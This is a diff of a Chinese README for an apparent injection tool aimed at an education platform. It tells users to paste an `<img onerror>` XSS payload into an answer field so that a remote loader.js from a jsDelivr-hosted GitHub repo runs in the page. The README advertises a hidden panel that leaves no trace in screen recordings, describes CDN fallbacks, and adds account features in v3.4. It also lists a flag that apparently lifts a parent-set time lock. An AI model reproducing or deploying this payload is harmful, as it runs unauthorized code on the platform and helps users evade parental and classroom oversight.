@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.3/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.4/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -27,6 +27,16 @@
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.4
+
+- 新增 👤 账号（用户名 + PIN）：聊天室、上传 / 更新配置、网页配置这些需要身份的功能，先登录账号再使用。
+  - 第一次输入的用户名会自动注册；PIN 4-30 位。登录状态存在本机 `fh:acct`，刷新 / 重开页面都不用再输，直到手动「退出登录」或清空缓存。
+  - 用户名 + PIN 每 5 秒只能提交一次，失败后按钮会倒计时提示。
+  - AI Key、上传 Token、网页常用站点（`fh:sites`）都归到当前账号：登录时载入、保存时同步回账号、退出后从本机清掉。换设备可用 ⬇ 更新配置（PIN）恢复其余配置。
+  - 聊天室发送、⬆ 上传配置 / ⬇ 更新配置要求已登录且本机有 GitLab Token；没有 Token 时提示先去 🔑 保存，聊天室只读、发送置灰。
+  - 旧版按 API Key / Token 哈希隔离的会话与相册，在首次登录时会自动迁到账号名下。
+  - 账号记录与 PIN 哈希只存本机 `fh:acct`，不会随配置上传。
 
 ## v3.3
 
@@ -74,6 +84,7 @@
 | 按钮 | 文件 | 作用 |
 |---|---|---|
 | 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照/相册、多会话、Chat/Responses、模型扫描、共享聊天室、探测缓存 |
+| 👤 账号 | `loader.js` | 用户名 + PIN 登录（本机持久）；AI Key / Token / 网页配置按账号保存 |
 | ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到 `config/<id>.json`（除 API Key / 会话 / 缓存） |
 | ⬇ 更新配置 | `loader.js` | 输入 PIN 从云端解密取回配置，换设备/清缓存后一键恢复 |
 | ◐ 透明度 | `loader.js` | 主面板与模块窗口 5%–100%，标题栏保持可操作 |
@@ -124,7 +135,7 @@
 }
 ```
 
-`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）；插件自身配置 `fh:*`（主题、主面板透明度、`fh:sites`、`fh:note`、AI 地址/模型/思考深度/Token 等），其中 `fh:ai:key` 永不上传，`fh:cfg:id` / `fh:cfg:at` / `fh:cfg:admKey` 记录本机云端配置状态。
+`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）；插件自身配置 `fh:*`（主题、主面板透明度、`fh:sites`、`fh:note`、AI 地址/模型/思考深度/Token 等），其中 `fh:ai:key` 永不上传，`fh:cfg:id` / `fh:cfg:at` / `fh:cfg:admKey` 记录本机云端配置状态；`fh:acct` 存账号（用户名 / PIN 哈希 / 账号的 Key、Token、网页配置），同样不上传。
 
 ## 注意
 
